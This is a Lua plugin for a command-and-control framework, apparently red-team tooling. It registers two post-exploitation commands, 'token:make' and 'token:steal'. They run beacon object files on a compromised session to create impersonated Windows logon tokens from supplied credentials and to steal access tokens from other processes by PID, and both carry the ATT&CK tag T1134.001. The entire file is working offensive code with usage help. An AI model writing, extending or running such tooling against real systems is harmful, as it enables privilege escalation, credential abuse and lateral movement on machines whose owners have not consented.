local function bof_path(bof_name, arch)
    return "bof/token/" .. bof_name .. "/" .. bof_name .. "." .. arch .. ".o"
end
-- make_token
local function run_make_token(cmd)
    local username = cmd:Flags():GetString("username")
    local password = cmd:Flags():GetString("password")
    local domain = cmd:Flags():GetString("domain")
    local logon_type = cmd:Flags():GetString("type")

    if username == "" then
        error("username is required")
    end
    if password == "" then
        error("password is required")
    end
    if domain == "" then
        error("domain is required")
    end
    if logon_type == "" then
        logon_type = "9"  -- Default to NewCredentials
    end

    -- Validate logon type
    local valid_types = {["2"] = true, ["3"] = true, ["4"] = true, ["5"] = true, ["8"] = true, ["9"] = true}
    if not valid_types[logon_type] then
        error("Invalid logon type. Valid types: 2 (Interactive), 3 (Network), 4 (Batch), 5 (Service), 8 (NetworkCleartext), 9 (NewCredentials)")
    end

    local packed_args = bof_pack("ZZZi", username, password, domain, tonumber(logon_type))
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("make_token", arch)
    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_make_token = command("token:make", run_make_token, "Create impersonated token from credentials <username> <password> <domain> [type]", "T1134.001")
cmd_make_token:Flags():String("username", "", "username for token creation")
cmd_make_token:Flags():String("password", "", "password for token creation")
cmd_make_token:Flags():String("domain", "", "domain for token creation")
cmd_make_token:Flags():String("type", "9", "logon type (2-Interactive, 3-Network, 4-Batch, 5-Service, 8-NetworkCleartext, 9-NewCredentials)")
opsec("token:make", 9.0)

help("token:make", [[
Create an impersonated token from given credentials:
  token:make --username admin --password P@ssword --domain domain.local --type 8
  token:make --username admin --password P@ssword --domain domain.local

Logon types:
  2 - Interactive
  3 - Network
  4 - Batch
  5 - Service
  8 - NetworkCleartext
  9 - NewCredentials (default)
]])

-- steal_token
local function run_steal_token(cmd,args)
    local pid
    if args and #args == 1 then
        pid = args[1]
    else
        pid = cmd:Flags():GetString("pid")
    end

    if pid == "" then
        error("process ID is required")
    end

    -- Validate PID is numeric
    local pid_num = tonumber(pid)
    if pid_num == nil or pid_num < 0 then
        error("Invalid process ID: " .. pid)
    end

    local packed_args = bof_pack("i", pid_num)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("steal_token", arch)
    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_steal_token = command("token:steal", run_steal_token, "Steal access token from a process <pid>", "T1134.001")
cmd_steal_token:Flags():String("pid", "", "process ID to steal token from")
opsec("token:steal", 9.0)

help("token:steal", [[
Steal access token from a process:
  token:steal 1234
  token:steal --pid 1234

Note:
- Requires appropriate privileges to access target process
- Target process must have a valid access token
]])